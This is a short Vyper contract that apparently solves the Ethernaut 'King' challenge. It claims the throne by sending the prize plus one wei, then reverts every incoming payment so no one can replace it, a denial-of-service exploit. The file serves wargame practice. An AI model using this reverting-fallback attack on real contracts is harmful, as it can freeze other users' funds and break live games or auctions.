# @version ^0.3.7

interface InstanceInterface:
    def prize() -> uint256: view
    def _king() -> address: view

owner: immutable(address)

instance: InstanceInterface

@external
@payable
def __init__(_instance: InstanceInterface):
    assert msg.value >= as_wei_value(0.001, "ether"), "send >= 0.001 ETH"
    owner = msg.sender
    self.instance = _instance

@external
def attack():
    assert msg.sender == owner, "!owner"
    assert self.balance > self.instance.prize(), "need more ether"
    raw_call(self.instance.address, b"", value=(self.instance.prize() + 1))
    assert self.instance._king() == self, "!king"

@external
def withdraw():
    assert msg.sender == owner, "!owner"
    send(msg.sender, self.balance)

@external
@payable
def __default__():
    raise "lol"
